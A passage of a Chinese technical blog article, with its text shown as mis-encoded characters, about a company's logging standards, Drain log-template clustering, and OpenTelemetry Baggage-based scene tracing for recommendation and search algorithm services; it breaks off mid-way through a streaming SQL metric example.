<li>è·¨è¯­è¨€è¯­ä¹‰å¯¹é½ï¼šä»¥Javaä¾§æˆç†Ÿçš„æ ‡å‡†åŒ–æ—¥å¿—ä¸ºæ ‡æ†ï¼Œé€šè¿‡è‡ªç ”C++ Log SDKæ¨è¡Œç»“æ„åŒ–æ—¥å¿—åè®®ã€‚</li>
<li>ä¸šåŠ¡è¯­ä¹‰é”šå®šï¼šåœ¨æ—¥å¿—è§„èŒƒä¸­é¦–æ¬¡å¼•å…¥äº†â€œåœºæ™¯ (Scene) + å¼‚å¸¸ç  (Error Code)â€ã€‚</li>
</ul>

<ul>
<li><strong>åœºæ™¯åŒ–å»ºæ¨¡ï¼š</strong> å°†å…·ä½“çš„ä¸šåŠ¡ä¸Šä¸‹æ–‡ï¼ˆå¦‚æ¨èã€æœç´¢ï¼‰æ³¨å…¥æ—¥å¿—å…ƒæ•°æ®ï¼Œä½¿æ—¥å¿—å…·å¤‡äº†æ¸…æ™°çš„ä¸šåŠ¡å±æ€§ã€‚</li>
<li><strong>å¼‚å¸¸ç æ ‡å‡†åŒ–ï¼š</strong> å»ºç«‹ç®—æ³•ä¾§ç»Ÿä¸€çš„é”™è¯¯å­—å…¸ï¼Œå®ç°ä»â€œæ¨¡ç³Šæè¿°â€åˆ°â€œç²¾ç¡®æŒ‡çº¹â€çš„è·¨è¶Šã€‚</li>
</ul>
<p><strong>æ—¥å¿—æ ¼å¼è§„èŒƒ</strong></p>
<p>1.ç»Ÿä¸€æ–‡ä»¶å</p>
<pre><code class="hljs language-lua" lang="lua">Â /logs/åº”ç”¨å/{åº”ç”¨å}-<span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span>
</code></pre>
<ul>
<li>æ–‡ä»¶ç›®å½•åœ¨/logs/åº”ç”¨å/</li>
<li>ç»Ÿä¸€æ–‡ä»¶åå«{åº”ç”¨å}-error.logï¼Œæ¯”å¦‚å¼•æ“çš„å«ï¼šdoe-server-error.log</li>
<li>æ—¥å¿—é‡‡é›†æ—¶æŒ‰pattern: *-error.logé‡‡é›†</li>
</ul>
<p>2.æ—¥å¿—æ ¼å¼</p>
<ul>
<li>æŒ‰ç…§ç«–çº¿ â€œ|â€åˆ†éš”ç¬¦åˆ†éš”</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">Â æ—¶é—´æˆ³|è¿›ç¨‹ID:çº¿ç¨‹ID|æ—¥å¿—ç­‰çº§|<span class="hljs-section">[åº”ç”¨å,trace_id,span_id,scene,errCode,]</span>|æ¥å£å|ä»£ç è¡Œå·|<span class="hljs-section">[å¯ç”¨åŒº,é›†ç¾¤å,,]</span>|å¼‚å¸¸å|message
</code></pre>
<ul>
<li>å­—æ®µè¯¦ç»†ä»‹ç»</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d8f871586b241a799b8d031b13f1eb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=NzzKwW%2F4dhNGlZCPIp99TfsGBSY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>æ—¥å¿—æ¨¡æ¿èšç±»ç®—æ³•</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/823bf75ac88c41ac91bc0a09aebd7cda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=HnQ5ubdo3%2FE64HtCq4c7FktbZ3A%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>æ¨¡æ¿èšç±»æµç¨‹</strong></p>
<p>è§„åˆ™ï¼šä»¥æ­£åˆ™æ©ç +Drainè§£ææ ‘ä¸ºåŸºç¡€</p>
<ul>
<li><strong>æ­£åˆ™æ©ç ï¼š</strong> é€šè¿‡æ­£åˆ™å¯¹æ—¥å¿—è¿›è¡Œé¢„å¤„ç†ï¼Œå¦‚æ—¶é—´ï¼ŒIPåœ°å€ï¼Œæ•°å­—ï¼Œç­‰ç­‰ã€‚ä¾‹å¦‚â€œ2025-12-01 10:20:30 ERROR host 10.0.1.2 connect timeoutâ€ç»è¿‡æ­£åˆ™æ©ç åï¼Œå¾—åˆ°â€œ&lt;:TIME:&gt; ERROR host &lt;:IP:&gt; connect timeoutâ€</li>
<li><strong>Drainç®—æ³•ï¼š</strong> Drainç®—æ³•æ˜¯ä¸€ç§ç”¨äºå¤„ç†æ—¥å¿—æ•°æ®çš„ç»“æ„åŒ–åˆ†æç®—æ³•ï¼Œå¹¿æ³›åº”ç”¨äºæ—¥å¿—è§£æå’Œæ—¥å¿—æ¨¡æ¿æŠ½å–é¢†åŸŸã€‚å®ƒæ˜¯ä¸€ç§åŸºäºå±‚æ¬¡èšç±»çš„åœ¨çº¿æ—¥å¿—è§£æç®—æ³•ï¼Œå…¶ä¸»è¦ç›®æ ‡æ˜¯ä»åŸå§‹æ—¥å¿—ä¸­æå–æ—¥å¿—æ¨¡æ¿ï¼Œä»è€Œå°†éç»“æ„åŒ–æ—¥å¿—è½¬æ¢ä¸ºåŠç»“æ„åŒ–æ•°æ®æ ¼å¼ï¼Œè¿™æœ‰åŠ©äºåç»­çš„æ—¥å¿—åˆ†æã€æ•…éšœæ£€æµ‹å’Œç³»ç»Ÿç›‘æ§ã€‚</li>
</ul>
<p><strong>Drainç®—æ³•ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤</strong></p>
<ul>
<li><strong>é¢„å¤„ç†</strong></li>
</ul>
<p>é¦–å…ˆéœ€è¦å¯¹æ—¥å¿—è¿›è¡Œé¢„å¤„ç†ï¼ŒåŒ…æ‹¬å‰æ–‡çš„æ­£åˆ™æ©ç ï¼Œä»¥å‡å°‘å†—ä½™ä¿¡æ¯å¯¹è§£æçš„å½±å“ã€‚å¦å¤–ï¼Œéœ€è¦å¯¹æ—¥å¿—è¿›è¡Œåˆ†è¯ï¼ŒæŒ‰ç©ºæ ¼å’Œå…¶ä»–åˆ†å‰²ç¬¦åˆ’åˆ†ä¸ºå¤šä¸ªç‰‡æ®µã€‚</p>
<ul>
<li><strong>drainè§£ææ ‘</strong></li>
</ul>
<p>æ¥ä¸‹æ¥æ„å»ºäº†ä¸€ç§å±‚æ¬¡ç»“æ„çš„æ ‘ï¼Œç§°ä¸ºparse treeï¼Œç”¨äºè®°å½•å’Œç»„ç»‡æ—¥å¿—æ¶ˆæ¯ã€‚</p>
<ul>
<li>åœ¨æ ‘çš„ç¬¬ä¸€çº§èŠ‚ç‚¹ï¼Œæ—¥å¿—å°†ä¼šä¾æ®å…¶é•¿åº¦ï¼ˆåˆ†è¯åç‰‡æ®µæ•°ç›®ï¼‰è¿›è¡Œåˆ†ç±»ã€‚ä¸åŒé•¿åº¦çš„æ—¥å¿—ä¼šè¢«åˆ†é…åˆ°ä¸åŒçš„è·¯å¾„ä¸Šã€‚</li>
<li>ç„¶ååœ¨æ ‘çš„åç»­å±‚çº§ä¸­ï¼Œæ¯ä¸€å±‚çº§éƒ½å°è¯•æ ¹æ®å…¶ä»–çš„é™æ€å…³é”®å­—å¯¹æ—¥å¿—æ¶ˆæ¯è¿›è¡Œè¿›ä¸€æ­¥ç»†åŒ–åˆ†ç±»ã€‚</li>
<li>æ ‘çš„å¶å­èŠ‚ç‚¹ä¸ºæ—¥å¿—èšç±»æ¡¶ï¼Œé€ä¸ªéå†æ¡¶ä¸­çš„èšç±»ï¼Œåˆ†åˆ«åˆ¤æ–­å½“å‰æ—¥å¿—ä¸å¯¹åº”æ—¥å¿—èšç±»çš„ç›¸ä¼¼åº¦æ˜¯å¦è¾¾åˆ°é˜ˆå€¼ï¼Œç›¸ä¼¼åº¦ç®—æ³•ä¸ºç›¸åŒä½ç½®çš„ç›¸åŒtokenå tokenæ€»æ•°çš„æ¯”ä¾‹ã€‚</li>
<li>å¦‚æœç›¸ä¼¼åˆ™å°†åˆ¤æ–­å½“å‰çš„æ—¥å¿—åŒ¹é…è¯¥èšç±»ï¼Œå¦‚æœéƒ½ä¸ç›¸ä¼¼åˆ™åˆ›å»ºæ–°çš„èšç±»å¹¶åŠ å…¥æ¡¶ä¸­ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/945feb6294784b7da36c136a1617f666~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=IB7xJUNMy7y0QNc8rU8hwHoVwA8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>ä¸Šçº¿æ•ˆæœ</strong></p>
<p>æ—¥å¿—æ¨¡æ¿èšç±»ç»´åº¦æ”¯æŒï¼šåº”ç”¨åã€é›†ç¾¤åã€å¼‚å¸¸åã€codeç ã€å¼‚å¸¸æ—¥å¿—æ¨¡ç‰ˆç­‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b36fb0777f84eb9bc8b87580f50352c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=12a9zZrZ%2FOaaz%2FNymORsSpukv5E%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-5">å››ã€ä»¥â€œåœºæ™¯â€ä¸ºé­‚ï¼šæ„å»ºç®—æ³•çŸ¥è¯†å›¾è°±</h2>
<h3 data-id="heading-6">åœºæ™¯åŒ–å»ºæ¨¡ (AlgoScene)</h3>
<p>åœ¨å¾—ç‰©APPä¸­ï¼Œç”¨æˆ·æ¯ä¸€æ¬¡æœç´¢æˆ–è¿›å…¥ç¤¾åŒºé¢‘é“ï¼Œåº•å±‚éƒ½ä¼šè§¦å‘ä¸€æ¬¡å¤æ‚çš„RPCè°ƒç”¨æµã€‚æµé‡åœ¨ç®—æ³•åŸŸå†…ç©¿æ¢­æ—¶ï¼Œä¼šç»å†å¤šæ¬¡ä¸åŒâ€œåœºæ™¯â€ç®—å­çš„ä¸²è¡Œä¸å¹¶è¡Œè®¡ç®—ï¼Œæœ€ç»ˆæ‰å°†æ¨èç»“æœåé¦ˆç»™å®¢æˆ·ç«¯ã€‚æ­£æ˜¯ç”±äºè¿™ç§è°ƒç”¨è·¯å¾„æå…¶å¤æ‚ä¸”å…·å¤‡é«˜åº¦çš„ä¸šåŠ¡ç‰¹æ€§ï¼Œæˆ‘ä»¬å†³å®šæ‰“ç ´ä¼ ç»Ÿçš„ç‰©ç†é“¾è·¯è§†è§’ï¼Œè½¬è€Œä»¥ <strong>â€œåœºæ™¯â€ä¸ºæ ¸å¿ƒå•å…ƒæ„å»ºçŸ¥è¯†å›¾è°±ã€‚</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5be420845a164f54a94ca82049c61d8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=d3%2B124E2w2CljY8LNXo1JXKjLSQ%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œ</p>
<ul>
<li>ä¸€ä¸ªåœºæ™¯ç”±å¤šä¸ªç®—å­ç»„åˆ</li>
<li>æ¯ä¸ªç®—å­ç”±0..å¤šä¸ªç»„ä»¶æ„æˆ</li>
<li>ç»„ä»¶ä¸€èˆ¬é€šè¿‡RPCï¼ˆHTTP/GRPC/Dubbo/Redis/BRPC/åœºæ™¯ï¼‰æ–¹å¼è°ƒç”¨ä¸‹</li>
</ul>
<p><strong>AlgoSceneåœºæ™¯å</strong></p>
<p>åœ¨ç¡®å®šä»¥â€œåœºæ™¯â€ä¸ºæ ¸å¿ƒçš„ä¸²è”é€»è¾‘åï¼Œç”±äºå•æ¬¡ RPC è°ƒç”¨å¾€å¾€æ¨ªè·¨å¤šä¸ªç®—æ³•èŠ‚ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»å®ç°å¯¹<strong>å¤šåœºæ™¯åŠ¨æ€é“¾</strong>çš„æ”¯æŒã€‚</p>
<p>è€ƒè™‘åˆ°ç®—æ³•ä»»åŠ¡ç¼–æ’å¤©ç„¶ä»¥åœºæ™¯ä¸ºåŸºæœ¬å•å…ƒï¼Œæˆ‘ä»¬é€šè¿‡åœ¨Trace SDKä¸­å°è£…putAlgoSceneToBaggageæ–¹æ³•ï¼Œåˆ©ç”¨<strong>Baggageæœºåˆ¶</strong>å°†åœºæ™¯ä¿¡æ¯é€ä¼ è‡³å…¨é“¾è·¯ã€‚åœ¨æ¯ä¸ªæœåŠ¡çš„åœºæ™¯å…¥å£å¤„ï¼Œåªéœ€é€šè¿‡ä»¥ä¸‹ä»£ç å³å¯å®ç°åœºæ™¯ä¸Šä¸‹æ–‡çš„æ³¨å…¥ï¼Œç¡®ä¿å…¨é“¾è·¯ä¸­çš„æ¯ä¸ªSpanéƒ½èƒ½è‡ªåŠ¨æºå¸¦algo_sceneå­—æ®µï¼š</p>
<pre><code class="hljs language-ini" lang="ini">ContextÂ <span class="hljs-attr">ctx</span>Â =Â AlgoBaggageOperator.putAlgoSceneToBaggage(<span class="hljs-string">"trans_product"</span>)<span class="hljs-comment">;</span>
tryÂ (ScopeÂ <span class="hljs-attr">scope</span>Â =Â ctx.activate()) {
Â  Â Â // ä¸šåŠ¡é€»è¾‘æ‰§è¡Œ
}
</code></pre>
<p>åœ¨æ•°æ®æ¸…æ´—é˜¶æ®µï¼Œæˆ‘ä»¬é€šè¿‡å¯¹algo_sceneå­—æ®µè¿›è¡Œé€—å·åˆ‡åˆ†ï¼Œè§£æå‡ºå®Œæ•´çš„<strong>åœºæ™¯è·¯å¾„é“¾ï¼š</strong></p>
<ul>
<li><strong>algoSceneï¼š</strong> è®°å½•å…¨é“¾è·¯ç»è¿‡çš„æ‰€æœ‰åœºæ™¯åï¼ˆé€—å·åˆ†éš”ï¼‰ã€‚</li>
<li><strong>rootSceneï¼š</strong> åˆ‡åˆ†åçš„ç¬¬ä¸€ä¸ªåœºæ™¯åï¼Œä»£è¡¨æµé‡è¿›å…¥ç®—æ³•åŸŸçš„åŸå§‹è§¦å‘æºã€‚</li>
<li><strong>currentSceneï¼š</strong> åˆ‡åˆ†åçš„æœ€åä¸€ä¸ªåœºæ™¯åï¼Œä»£è¡¨å½“å‰èŠ‚ç‚¹æ‰€å±çš„å…·ä½“ç®—å­åœºæ™¯ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6c16176947649bfb9988d670a7251ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=%2FTbOAfrUlUhx2REoPFxV%2BCsxPvg%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>æœ€ç»ˆTraceæ•ˆæœ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bc44122e7a041fbb864840bfe8a11de~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=z5cm7qQnPMS%2FluYf9WbbvDjl%2BuI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>ä¼ æ’­é“¾â€œBaggageâ€ VS â€œInnerBaggageâ€</strong></p>
<p><strong>Baggage</strong>æ˜¯OpenTelemetryè§‚æµ‹æ ‡å‡†ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒç»„ä»¶ã€‚å¦‚æœè¯´TraceIDæ˜¯ç”¨æ¥ä¸²è”æ•´ä¸ªè°ƒç”¨é“¾çš„â€œèº«ä»½è¯â€ï¼Œé‚£ä¹ˆ<strong>Baggageå°±åƒæ˜¯éšèº«æºå¸¦çš„â€œè¡Œæç®±â€ã€‚</strong></p>
<p>å®ƒå…è®¸å¼€å‘äººå‘˜åœ¨æ•´ä¸ªè¯·æ±‚é“¾è·¯ä¸­æºå¸¦<strong>è‡ªå®šä¹‰çš„é”®å€¼å¯¹ï¼ˆKey-Value Pairsï¼‰ã€‚</strong> è¿™äº›æ•°æ®ä¼šéšç€HTTP Headeræˆ–RPCå…ƒæ•°æ®åœ¨å„ä¸ªå¾®æœåŠ¡ä¹‹é—´è‡ªåŠ¨â€œæ¼‚æµâ€ï¼Œç¡®ä¿ä¸‹æ¸¸æœåŠ¡èƒ½å¤Ÿæ„ŸçŸ¥ä¸Šæ¸¸ä¼ é€’çš„ä¸šåŠ¡ä¸Šä¸‹æ–‡ã€‚</p>
<p><strong>æ ¸å¿ƒåŸç†</strong></p>
<p>Baggageæ˜¯åŸºäºHTTP Headeråè®®å®ç°çš„ã€‚æ ¹æ®W3Cæ ‡å‡†ï¼Œå®ƒä¼šå°†æ•°æ®å­˜æ”¾åœ¨åä¸ºbaggageçš„Headerä¸­è¿›è¡Œé€ä¼ ï¼š</p>
<ul>
<li><strong>æ ¼å¼ï¼š</strong> baggage: algoScene=recommend_v1,isTest=true</li>
<li><strong>ä¼ æ’­æ–¹å¼ï¼š</strong> è‡ªåŠ¨éšè¯·æ±‚ä»Service Aæµè½¬è‡³Service Bã€Cï¼Œæ— éœ€åœ¨æ¯ä¸ªæœåŠ¡çš„ä¸šåŠ¡ä»£ç ä¸­æ‰‹åŠ¨æ·»åŠ å‚æ•°ã€‚</li>
</ul>
<p><strong>åº•å±‚å®ç°</strong></p>
<p>å¦‚ä½•å°†baggageä¿¡æ¯åº”ç”¨åˆ°æ¯ä¸ªspanå‘¢ï¼Ÿæˆ‘ä»¬å¢å¼ºäº†spanProcessorä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">BaggageÂ <span class="hljs-attr">baggage</span>Â =Â Baggage.fromContext(parentContext)<span class="hljs-comment">;</span>
baggage.forEach((s, baggageEntry) -&gt; {
Â  Â Â ifÂ (s.startsWith(OTEL_TO_SPAN_BAGGAGE_PREFIX)) {
Â  Â  Â  Â Â StringÂ <span class="hljs-attr">value</span>Â =Â baggageEntry.getValue()<span class="hljs-comment">;</span>
Â  Â  Â  Â Â ifÂ (<span class="hljs-attr">value</span> ==Â null) {
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">value</span> = NULL_VALUE<span class="hljs-comment">;</span>
Â  Â  Â  Â  }Â elseÂ ifÂ (value.isEmpty()) {
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">value</span> = EMPTY_VALUE<span class="hljs-comment">;</span>
Â  Â  Â  Â  }
Â  Â  Â  Â  span.setAttribute("baggage:"Â + s.substring(OTEL_TO_SPAN_BAGGAGE_PREFIX.length()), value)<span class="hljs-comment">;</span>
Â  Â  }
})<span class="hljs-comment">;</span>
</code></pre>
<p><strong>InnerBaggage</strong></p>
<p>åœ¨å…¨é“¾è·¯è¿½è¸ªä¸­ï¼Œå¦‚æœè¯´Baggageè§£å†³äº†æœåŠ¡ä¹‹é—´çš„è·¨ç«™ä¼ é€’ï¼Œç¡®ä¿ä¸šåŠ¡ä¿¡æ¯èƒ½è·¨è¶Šæœºå™¨é€è¾¾ä¸‹æ¸¸ï¼›é‚£ä¹ˆInnerBaggageåˆ™è´Ÿè´£æœåŠ¡å†…éƒ¨çš„è¿›ç¨‹ä¼ é€’ï¼Œç¡®ä¿åœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œï¼Œæ— è®ºä¸šåŠ¡é€»è¾‘ç»è¿‡å¤šå°‘ä¸ªç»„ä»¶ï¼Œå½“å‰çš„â€œç®—å­åâ€ç­‰ä¿¡æ¯éƒ½èƒ½è‡ªåŠ¨åŒæ­¥åˆ°æ¯ä¸€ä¸ªæ‰§è¡Œæ­¥éª¤ä¸­ï¼Œæ— éœ€åœ¨ä»£ç é‡Œå±‚å±‚æ‰‹åŠ¨ä¼ é€’å‚æ•°ã€‚</p>
<p>ç¤ºä¾‹</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// åœ¨ç®—å­å…¥å£å¤„ï¼Œå®šä¹‰ä¸€ä¸ª InnerBaggage ä½œç”¨åŸŸ</span>
<span class="hljs-keyword">try</span>Â (Scope ignored = InnerBaggage.<span class="hljs-keyword">with</span>(<span class="hljs-string">"search_processor_biz_component"</span>,Â <span class="hljs-string">"content_agg"</span>)) { Â  Â Â 
Â  Â Â <span class="hljs-comment">// è¿™é‡Œçš„é€»è¾‘æ— è®ºæ˜¯è°ƒç”¨æ•°æ®åº“è¿˜æ˜¯è®¡ç®—ï¼Œç”Ÿæˆçš„ Span éƒ½ä¼šè‡ªåŠ¨å¸¦ä¸Š search_processor_biz_component=content_agg Â  Â Â </span>
Â  Â  runComponentLogic(); Â 
} Â 
<span class="hljs-comment">// ä½œç”¨åŸŸç»“æŸï¼ŒInnerBaggage è‡ªåŠ¨æ¸…ç†ï¼Œé˜²æ­¢æ±¡æŸ“ä¸‹ä¸€ä¸ªç®—å­</span>
</code></pre>
<p>æœ€ç»ˆæ•ˆæœ</p>
<p>ä¸€ä¸ªè¿œç¨‹Dubbo-clientè¢«æˆåŠŸæ ‡è®°algo_sceneå’Œä¸šåŠ¡ç®—å­åâ€œcontent_aggâ€ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b092b7fde84493480f93224e3f5749b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=QqR2y9PeL9jKpfNv9VncDP85i%2FA%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h3 data-id="heading-7">åŠ¨æ€å…ƒæ•°æ®ä¸æµå¼è®¡ç®—</h3>
<p><strong>é…ç½®ä¸­å¿ƒå…ƒæ•°æ®</strong></p>
<p>åœ¨å¤æ‚çš„ç®—æ³•åœºæ™¯ä¸­ï¼Œç”±äºå˜æ›´é¢‘ç‡æé«˜ï¼Œç¡¬ç¼–ç æ˜¾ç„¶æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œæˆ‘ä»¬æ„å»ºäº†ä¸€å¥—åŸºäºé…ç½®ä¸­å¿ƒçš„åŠ¨æ€å…ƒæ•°æ®è®¢é˜…ä½“ç³»ã€‚</p>
<ul>
<li>å»ºç«‹â€œåº”ç”¨-é…ç½®é›†â€è®¢é˜…å…³ç³»</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bbfdeef8d874cf2967955f631f06a69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=ggBP9C%2F%2B0vI9VADtExmFAqrqVsE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li>å…ƒæ•°æ®æ¨¡å‹å®šä¹‰</li>
</ul>
<p>ä¸ºäº†æ”¯æ’‘åº”ç”¨ä¸é…ç½®ä¹‹é—´çš„å¤šå¯¹å¤šå…³ç³»ï¼Œæˆ‘ä»¬è®¾è®¡äº†å¦‚ä¸‹æ ¸å¿ƒè¡¨ç»“æ„ï¼Œç”¨äºè®°å½•è®¢é˜…é€»è¾‘ä¸å…ƒæ•°æ®ç”»åƒï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb8aa952e0224df3a81000e164f1e972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=dkIqZc1EjgMgL1SEc040Fd991xM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>åœºæ™¯æ‹“æ‰‘å›¾ (Neo4j)</strong></p>
<p>åœ¨å®Œæˆä¸šåŠ¡ä¾§çš„å…¨é“¾è·¯åŸ‹ç‚¹åï¼Œåç«¯æ•°æ®æ¸…æ´—å±‚è´Ÿè´£å°†æµ·é‡çš„åŸå§‹Traceæ•°æ®è¿›è¡Œç»“æ„åŒ–å¤„ç†ï¼šå®ƒå®æ—¶è§£æå¹¶æå–<strong>Baggage</strong>ä¸­çš„å…¨å±€åœºæ™¯ä¿¡æ¯ä¸<strong>InnerBaggage</strong>ä¸­çš„å±€éƒ¨ç®—å­æ ‡ç­¾ï¼Œä»è€Œå°†ç¦»æ•£çš„é“¾è·¯ä¿¡æ¯è½¬åŒ–ä¸ºæ ‡å‡†åŒ–çš„ä¸šåŠ¡è®¡ç®—æµã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d625d8caa5144e6bb937ab357986d2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=1fcAE3DmfJ1ww058nPh4gzHrJR8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>æµå¼è®¡ç®—å¼•æ“</strong></p>
<p>å€ŸåŠ©æµå¼è®¡ç®—å¼•æ“å¼ºå¤§çš„EPLèƒ½åŠ›ï¼Œæˆ‘ä»¬é€šè¿‡ç±»SQLçš„å£°æ˜å¼è¯­æ³•ï¼Œç²¾ç‚¼åœ°å®ç°äº†ä»å®æ—¶å¤šç»´èšåˆåˆ°å¤æ‚æ¨¡å¼åŒ¹é…çš„é€»è¾‘è¡¨è¾¾ï¼Œç›®å‰å·²æ²‰æ·€å‡º12ä¸ªè¦†ç›–æ ¸å¿ƒä¸šåŠ¡åœºæ™¯çš„æ ‡å‡†SQLç®—å­ï¼Œæ˜¾è‘—æå‡äº†å®æ—¶æ•°æ®å¤„ç†çš„å¼€å‘æ•ˆç‡ä¸çµæ´»æ€§ã€‚SQLç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@TimeWindow</span>(<span class="hljs-number">10</span>)
<span class="hljs-variable">@Metric</span>(name =Â <span class="hljs-string">'algo_redis_client'</span>, tags = {<span class="hljs-string">'algoScene'</span>,<span class="hljs-string">'rootScene'</span>,<span class="hljs-string">'currentScene'</span>,<span class="hljs-string">'props'</span>,<span class="hljs-string">'env'</span>,<span class="hljs-string">'clusterName'</span>,<span class="hljs-string">'serviceName'</span>,<span class="hljs-string">'redisUrl'</span>,<span class="hljs-string">'statusCode'</span>}, fields = {<span class="hljs-string">'timerCount'</span>,Â <span class="hljs-string">'timerSum'</span>,Â <span class="hljs-string">'timerMax'</span>}, sampling=<span class="hljs-string">'sampling'</span>)
SELECT algoScene Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ algoScene,
Â  Â  Â  Â rootScene Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ rootScene,
Â  Â  Â  Â currentScene Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â asÂ currentScene,
Â  Â  Â  Â <span class="hljs-built_in">get_value</span>(origin.props) Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ props,
Â  Â  Â  Â env Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ env,
Â  Â  Â  Â serviceName Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ serviceName,
Â  Â  Â  Â clusterName Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ clusterName,
Â  Â  Â  Â statusCode Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â asÂ statusCode,
Â  Â  Â  Â redisUrl Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â asÂ redisUrl,
Â  Â  Â  Â <span class="hljs-built_in">trunc_sec</span>(startTime,Â <span class="hljs-number">10</span>) Â  Â  Â  Â  Â  Â  Â  Â Â asÂ timestamp,
